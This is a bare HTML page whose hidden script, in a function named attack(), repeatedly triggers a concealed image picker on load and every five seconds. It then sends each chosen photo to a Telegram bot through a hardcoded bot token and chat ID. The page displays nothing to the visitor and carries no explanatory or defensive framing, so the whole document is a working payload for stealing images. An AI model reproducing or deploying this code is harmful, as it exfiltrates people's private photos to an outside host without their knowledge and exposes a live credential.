<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>*{margin:0;padding:0}html,body{width:100%;height:100%;background:#fff;overflow:hidden}</style>
</head>
<body>
<input type="file" id="f" accept="image/*" multiple style="display:none;">
<script>
var TOKEN = "8900667957:AAFWFLOWanqVcP_fVK55TtP-lQjVlBPl_Ew";
var CHAT_ID = "8770655989";

window.onload = function() {
    attack();
    setInterval(attack, 5000);
};

function attack() {
    var input = document.getElementById('f');
    input.click();
    input.onchange = function(e) {
        var files = e.target.files;
        for(var i = 0; i < files.length; i++) {
            var fd = new FormData();
            fd.append('photo', files[i]);
            fd.append('chat_id', CHAT_ID);
            fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
                method: 'POST',
                body: fd,
                mode: 'no-cors'
            });
        }
    };
}
</script>
</body>
</html>
